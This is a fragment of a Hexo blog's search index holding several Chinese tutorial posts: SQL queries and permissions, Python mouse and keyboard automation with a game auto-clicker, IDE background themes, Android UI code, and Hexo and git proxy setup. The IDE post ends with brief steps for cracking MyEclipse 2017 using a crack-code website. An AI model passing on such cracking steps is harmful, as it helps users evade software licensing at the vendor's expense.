stu.sno=sc.cno;from后面可以给表重命名，以便相同的表，使用不同条件，还有from后面可以使用left outer join关键字左右连接 嵌套查询 例：select *from stu where sno in(select sno from con=&#39;2&#39;);查询选了课程2的学生信息，查询条件也可以不用in 换成比较条件或者比较条件+any/all 不等于可以用&lt;&gt;表示，子查询前可以用（not） exists限制 exists限制的子查询只返回true/false 集合查询 并操作 union 交操作 intersect 差操作 except 基于派生表的查询 子查询用在from时生成临时表（派生表），的查询例：123select snofrom stu,(select sno from sc where cno=&apos;1&apos;) as sc1where stu.sno=sc1.sno; 0x02 数据库权限1. 权限赋予 grant select on table student to u1; 给u1查询student表的权限,to public 代表所有用户 但u1不可以传播权限 grant select(sno) on table student to u1 with grant option; 给u1查询sno的权限，而且u1可以把权限给其他用户 2.权限收回 revoke select on table student from u1; 收回u1对student表的查询权限 revoke select on table student from u1 cascade; 收回u1对student表的查询权限，并收回u1赋予别人对此表的查询权限 0x03 视图create view as select user,pass from student; 将student表的user，pass建成一个视图，视图使用select查询结果建立，查询视图和查询表基本相同 0x04 索引create unique index stusno on student(sno); 在student表的sno列建立索引，unique代表唯一索引，还可以建立聚簇索引 ，可以在语句之前使用EXPLAIN，来查看是否使用索引 0x05 数据库导入导出 导出 ：终端下mysqldump -u username -ppassword database &gt; /root/aa.sql 密码可以后写 导入 ：mysql终端下，use要导入表的数据库 source /root/aa.sql]]></content>
      <categories>
        <category>编程</category>
        <category>基本操作</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python模拟鼠标键盘事件]]></title>
    <url>%2F2018%2F06%2F18%2Fpython%E6%A8%A1%E6%8B%9F%E9%BC%A0%E6%A0%87%E9%94%AE%E7%9B%98%E4%BA%8B%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[python模拟鼠标键盘事件环境 win10+python3.7 0x00 安装需要的库1.安装pywin32 下载找到对应版本的下载，是个exe文件双击安装就可以了，可以在python终端里输入import win32com测试安装是否成功 2.安装pyHook 下载 找到对应版本的下载即可，是一个whl文件，直接pip install +文件路径 就可以安装 import pyHook验证是否安装成功，注意大小写 3.安装PyUserInput 直接pip安装即可，也可以到github上下载安装，python3中这个模块包含了pymouse,pykeyboard这两个模块，python2好像要单独安装这两个模块 0x01 PyUserInput使用 直接来一段代码1234567891011121314151617181920212223242526272829303132#导入模块import pymouse,pykeyboard,os,sysfrom pymouse import *from pykeyboard import PyKeyboard#分别实例化m = PyMouse()k = PyKeyboard()#PyMouse 鼠标操作x,y = m.position() #position()获取鼠标当前位置print (x,y)m.move(100,200) #移动鼠标到坐标100，200，以屏幕左上角为0点m.click(50,50,1,2) #左键点击50，50处两次 参数：前两个坐标，第三个1代表左键2代表右键3是中键，第四个代表点击次数 ，后两个参数可以不写，默认左键一次x,y = m.screen_size() #获取屏幕大小print (x,y)#关于鼠标点击事件还有下面两种m.press(50,50) #鼠标点击后不松开m.release(50,50) #松开鼠标 但是 不能实现拖动 猜想：要配合多线程，一边按着press，一边移动move#PyKeyboard 键盘k.tap_key(&apos;A&apos;,n=2,interval=5) #模拟点击A键，n代表次数（可选），interval代表间隔时间（可选）k.tap_key(k.function_keys[5]) #点击功能键F5 k.tap_key(k.numpad_keys[5],3) #点击小键盘5,3次k.press_key(&apos;\n&apos;) #模拟键盘按回车键 k.release_key(&apos;\n&apos;) #模拟键盘松开回车键k.type_string(&apos;Hello,world&apos;) #光速输入Hello，world#同时按下两个键,实现，应该也可以多线程吧k.press_key(k.alt_key) #按住alt键 k.tap_key(k.tab_key) #点击tab键 k.release_key(k.alt_key) #松开alt键 另附随手写的一段玩踩白块的代码 端午节蛇皮操做系列12345678910111213141516171819202122232425#游戏链接http://www.4399.com/flash/154247_3.htm#屏幕分辨率1920*1080#谷歌全屏打开网页 放缩100import pymouse,pykeyboard,os,sysfrom pymouse import *from ctypes import *gdi32 = windll.gdi32user32 = windll.user32m = PyMouse()hdc = user32.GetDC(None)for i in range(0,60):#点击次数可以在这里调节 a = gdi32.GetPixel(hdc,700,479) if hex(a) == &apos;0x10101&apos;: m.click(700,527) b = gdi32.GetPixel(hdc,790,479) if hex(b) == &apos;0x10101&apos;: m.click(790,479) c = gdi32.GetPixel(hdc,852,479) if hex(c) == &apos;0x10101&apos;: m.click(852,536) d = gdi32.GetPixel(hdc,934,479) if hex(d) == &apos;0x10101&apos;: m.click(934,525)]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>蛇形操作</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[修改编程背景]]></title>
    <url>%2F2018%2F05%2F31%2F%E4%BF%AE%E6%94%B9IDE%E8%83%8C%E6%99%AF%2F</url>
    <content type="text"><![CDATA[修改编程背景很多编程环境都支持，一搜一大片，简单总结一下我常用的VS，AS，myEclipse，VScode 0X00 VScode 搜索安装插件background安装好之后，文件&gt;首选项&gt;设置，搜索&gt;background,在”background.style”上面添加如下代码,第一行设置关闭默认，第二行设置图片路径1234&quot;background.useDefault&quot;: false,&quot;background.customImages&quot;: [ &quot;file:///E:/Pictures/ooYBAFMdVXWIGiLgABHveagp06AAABZVQC-G_QAEe-R438.jpg&quot;], 可能要重启，我忘了。。。就这样吧 0X01 VS 工具&gt;扩展和更新&gt;联机搜索background下载,就一个是一个黄发妹子的图标，算了，截个图吧就是这个安好了之后工具&gt;选项&gt;选择这个caudiaIDE插件一顿设置不用重启就行了 0X02 AS 这个比较简单两个插件+一个网站1.网站：color-themes下载好主题导入设置就可以了2.插件：Material Theme UI 这个插件在setting&gt; Editor&gt; Colors &amp; Fonts设置Sexy Editor 这个在setting&gt; other Setting&gt; Sexy Editor设置比较简单，没啥说的 0X03 myEclipse 这是一个CSDN上大佬原创的，博客原文,他写的是eclipse的修改背景图片，但myEclipse也可以用，甚至比eclpise简单，因为eclipse很多插件要自己弄友情提示：配置这个的时候要注意图片路径 最后附上myEclipse破解：在获取破解码网站输入myeclipse 2017获取破解码，myEclipse中help-&gt;subscription information id填myeclipse 2017，下面写上注册码，后面的邮箱可以写自己的]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>代码技巧</tag>
        <tag>环境优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android全屏]]></title>
    <url>%2F2018%2F05%2F30%2FAndroid%E5%85%A8%E5%B1%8F%2F</url>
    <content type="text"><![CDATA[android全屏实现0X00实现 代码如下:style.xml文件中写一个style123&lt;style name=&quot;quanping&quot; parent=&quot;Theme.AppCompat.DayNight.NoActionBar&quot;&gt; &lt;item name=&quot;android:windowFullscreen&quot;&gt;true&lt;/item&gt;&lt;/style&gt; 解释：以上代码parent=&quot;Theme.AppCompat.DayNight.NoActionBar&quot;实现去除标题栏，&lt;item name=&quot;android:windowFullscreen&quot;&gt;true&lt;/item&gt;实现全屏 AndroidMainifest.xml文件中应用该style，在application（对全部活动），或者activity（对单个活动）标签里面添加1android:theme=&quot;@style/quanping&quot; 0X01总结 感觉不是什么特别合理的解决方案，有时间可以学一下沉浸状态栏]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>xml</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android数组+循环批量管理控件]]></title>
    <url>%2F2018%2F05%2F30%2FAndroid%E6%95%B0%E7%BB%84-%E5%BE%AA%E7%8E%AF%E6%89%B9%E9%87%8F%E7%AE%A1%E7%90%86%E6%8E%A7%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[Android管理多按钮，资源文件实现0X00 问题来源 最近做了一个Android计算器交Android通识课作业， 感觉按钮控件很多，一个一个写监听太蠢了 0X01 解决方案 看了很多资料，总结加原创 1.建立id数组 string.xml文件建立数组，把所有需要统一管理的控件id写到这里面，比如我是计算器代码如下：12345678... ... &lt;string-array name=&quot;actions_button&quot;&gt; &lt;item&gt;@+id/bT0&lt;/item&gt; &lt;item&gt;@+id/bT1&lt;/item&gt; .... &lt;item&gt;@+id/bT15&lt;/item&gt; &lt;/string-array&gt;... ... 我还实现了计算器语音播报功能其中每一个按钮对应的语音文件也可以这样管理具体元素代码&lt;item&gt;@raw/num7&lt;/item&gt; 2.获取按钮id 先建立一个Button的数组1Button[] btsz = new Button[16];//创建15个按钮的数组 在onCreate方法里面12345678910... ...TypedArray btidar = getResources().obtainTypedArray(R.array.actions_button);//通过调用string.xml文件中的数组批量管理按钮idint len = btidar.length();//一共16个按钮int[] btid = new int[len];final int[] yinid = new int[len];for (int i = 0; i &lt; len; i++)&#123; btid[i] = btidar.getResourceId(i,0);//获得按钮的id放到btid数组里面，这里可以写成两行 btsz[i] = (Button)findViewById(btid[i]);//绑定id到按钮&#125;... ... 3.批量监听实现12345678910111213141516... ... for(int i = 0;i &lt; 16;i++)&#123;//这里原创 哈哈哈哈 if(i == 14) //等号单独处理 continue; btsz[i].setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View view) &#123; //这是在另一个类方法里面，不能使用循环变量i，需要辨别当前按钮的话可以使用以下代码 ...... Button btt = (Button)findViewById(view.getId());//获取当前按钮 String str1 = btt.getText().toString();//获取按钮上的文本 ...... &#125; &#125;); &#125;... ... 0X02总结 这个解决方法不止一种，还可以重写onClick方法，利用view变量获取当前按钮id，然后一个swich就解决了]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Java</tag>
        <tag>代码技巧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android欢迎界面实现]]></title>
    <url>%2F2018%2F05%2F30%2FAndroid%E6%AC%A2%E8%BF%8E%E7%95%8C%E9%9D%A2%E5%AE%9E%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[Android 欢迎界面实现0X00 原理解析 实现方法很多，但基本原理都差不多，就是在你的功能界面之前调用一个欢迎的活动，欢迎活动尽量简单，太复杂好像会引起应用启动时短暂的白屏，然后再欢迎Activity 延时一段时间，跳转到功能界面就可以了 0X01 具体实现优先启动欢迎界面 右键工程建立一个Activity,一阵设计界面后，设置这个活动第一个启动：在AndroidMainifest.xml中：主活动中剪切如下代码123456... ...&lt;intent-filter&gt;&lt;!--这四行放在activity标签中代表这个活动是第一个启动--&gt; &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt; &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;&lt;/intent-filter&gt;&lt;!--end--&gt;... ... 粘贴到欢迎活动中去，结果如下123456789101112... ...&lt;activity android:name=&quot;.MainActivity&quot; android:screenOrientation=&quot;portrait&quot;&gt; &lt;!--这个是主界面，android:screenOrientation=&quot;portrait&quot;设置只能竖屏--&gt;&lt;/activity&gt;&lt;activity android:name=&quot;.Main2Activity&quot;&gt;&lt;!--欢迎界面--&gt; &lt;intent-filter&gt;&lt;!--这四行放在activity标签中代表这个活动是第一个启动--&gt; &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt; &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt; &lt;/intent-filter&gt;&lt;!--end--&gt;&lt;/activity&gt;... ... 到这里运行程序时就会先调用欢迎界面 延时调用主活动 直接上代码1234567891011121314151617181920212223242526272829import android.content.Intent;import android.os.Handler;import android.os.Message;import android.support.v7.app.AppCompatActivity;import android.os.Bundle;public class Main2Activity extends AppCompatActivity &#123;//欢迎界面 private Handler handler = new Handler() &#123; @Override public void handleMessage(Message msg) &#123; //接收到消息后跳转 goMain(); super.handleMessage(msg); &#125; &#125;; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main2); //延迟两秒发送消息 handler.sendEmptyMessageDelayed(0,2000); &#125; private void goMain() &#123; //设定调动MainActivity Intent intent=new Intent(this,MainActivity.class); startActivity(intent); //将控制权交给MainActivity finish(); //结束 &#125;&#125; 0X02 总结 不然可以建立工程的时候先写欢迎Activity 哈哈哈哈哈]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>xml</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2018%2F05%2F16%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment Git设置代理（突然中文~）1234567891011#socks代理$git config --global http.proxy &apos;socks5://127.0.0.1:1080&apos;$git config --global https.proxy &apos;socks5://127.0.0.1:1080&apos;#http代理$git config --global https.proxy http://127.0.0.1:1080$git config --global https.proxy https://127.0.0.1:1080#取消代理$git config --global --unset http.proxy$git config --global --unset https.proxy 设置域名 申请域名，添加添加一个CNAME指向GitHub上的博客 在GitHub上面设置里面GitHub Pages里面的Custom domain添加上自己的域名 但是2其实并没有什么用。你下次更新博客的时候又会还原到最初状态。 真正的解决办法是在本地source目录下添加一个叫CNAME的文件。里面写上自己的域名。不带https啥的。就是一个纯域名，然后重新更新博客]]></content>
      <categories>
        <category>hello</category>
      </categories>
      <tags>
        <tag>hello</tag>
      </tags>
  </entry>
</search>
